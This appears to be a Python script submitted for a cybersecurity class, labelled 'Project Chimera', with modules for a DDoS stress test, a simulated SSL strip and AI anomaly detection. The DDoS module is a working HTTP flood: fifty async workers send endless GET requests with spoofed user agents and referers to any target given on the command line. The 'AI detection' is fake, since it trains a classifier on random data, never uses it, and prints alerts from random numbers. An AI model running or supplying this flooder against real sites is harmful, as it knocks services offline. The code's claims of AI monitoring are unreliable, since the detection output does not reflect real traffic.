# PROJECT CHIMERA v7.0 — Final Submission
# Advanced Cybersecurity Class
# Modules: DDoS Stress Test, SSL Strip Simulation, AI Anomaly Detection

import asyncio
import argparse
import random
import ssl
import socket
import numpy as np
from aiohttp import ClientSession, TCPConnector
from sklearn.svm import SVC

# --- CONFIGURATION ---
RPS_THRESHOLD = 50.0
CONN_THRESHOLD = 50.0
ENTROPY_THRESHOLD = 3.5
NUM_ATTACK_TASKS = 50

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS)...",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/random_link_here",
]

# --- AI MODEL ---
def train_anomaly_model():
    X = np.random.rand(100, 3)
    y = np.random.choice([0, 1], size=100)
    model = SVC()
    model.fit(X, y)
    return model

def analyze_traffic(rps, connections, entropy):
    return rps > RPS_THRESHOLD and connections > CONN_THRESHOLD and entropy > ENTROPY_THRESHOLD

# --- SSL STRIP SIMULATION ---
def simulate_ssl_strip(url):
    if url.startswith("https://"):
        stripped = url.replace("https://", "http://")
        print(f"[SSL STRIP] Redirected: {url} → {stripped}")
        return stripped
    return url

# --- IMF/TLS CONNECTION CHECK ---
def check_external_connection():
    try:
        socket.create_connection(("www.google.com", 443), timeout=2)
        return True
    except Exception:
        print("EXTERNAL CONNECTION FAILED (IMF/TLS Block).")
        return False

# --- Continuous DDoS Worker ---
async def ddos_worker(session, url):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
    }
    while True:
        try:
            async with session.get(url, headers=headers) as response:
                await response.read()
        except Exception:
            pass  # Ignore errors
        await asyncio.sleep(0)  # Yield control

# --- AI Monitoring Loop ---
async def monitoring_loop():
    try:
        while True:
            rps = random.uniform(100, 1000)
            entropy = round(random.uniform(3.0, 5.0), 2)
            print("--- BEGIN AI MONITORING LOG (PROJECT CHIMERA) ---")
            if analyze_traffic(rps, NUM_ATTACK_TASKS, entropy):
                print(f"STATUS: !!! APPLICATION LAYER ATTACK DETECTED !!! Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
            else:
                print(f"STATUS: Normal traffic | Rate: {int(rps)} rps | IPs: {NUM_ATTACK_TASKS} | Entropy: {entropy}")
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        pass

# --- Run Continuous Attack ---
async def run_attack(target_url):
    connector = TCPConnector(limit=NUM_ATTACK_TASKS)
    async with ClientSession(connector=connector) as session:
        workers = [ddos_worker(session, target_url) for _ in range(NUM_ATTACK_TASKS)]
        monitor = asyncio.create_task(monitoring_loop())
        try:
            await asyncio.gather(*workers)
        except asyncio.CancelledError:
            monitor.cancel()
            await monitor

# --- ENTRY POINT ---
async def main():
    parser = argparse.ArgumentParser(description="PROJECT CHIMERA v7.0")
    parser.add_argument("--target", required=True, help="Target URL")
    parser.add_argument("--mode", choices=["ddos", "sslstrip", "full"], default="full", help="Simulation mode")
    args = parser.parse_args()

    target = args.target
    mode = args.mode

    if not check_external_connection():
        print("Switching to internal AI simulation to demonstrate detection...")

    if mode == "sslstrip":
        simulate_ssl_strip(target)
    elif mode == "ddos":
        await run_attack(target)
    elif mode == "full":
        stripped_url = simulate_ssl_strip(target)
        await run_attack(stripped_url)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Interrupted by user. Exiting gracefully...")
